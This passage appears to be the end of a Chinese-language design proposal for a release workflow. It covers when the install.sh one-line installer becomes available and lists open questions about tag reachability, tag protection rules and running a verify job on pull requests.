注意：`install.sh` 的 raw URL 指向 `main` 分支，因此**脚本必须先合并进 `main` 才能被 README 里的命令下载到**；且在推出第一个 tag 之前 `releases/latest` 不存在，一行式安装命令会因查不到 latest Release 而失败。这是预期的时序（步骤 3 之后、步骤 4 之前的窗口）。

## Open Questions

- **D15（tag 必须可从默认分支到达）是我对"在 master 分支打 tag"的落实方式，不是裁决明确要求的**。若这条约束不需要，删掉那一个 step 即可——但请先读 D15 里"它同时承担版本混淆防护"那一段，那是删除它的连带代价。请在下一轮 approval 时明确接受或否掉。
- 是否要用 GitHub 的 tag 保护规则（ruleset）限制谁能推 `v*` tag？本变更只在 README 里给建议，不代为配置（那是仓库设置，不在代码里）。
- 是否要在 PR 上也跑 `verify` job（`on.pull_request`）？本变更范围内不做。若将来加上，D13 与 D18 的约束仍需保持，且不得改用 `pull_request_target`。
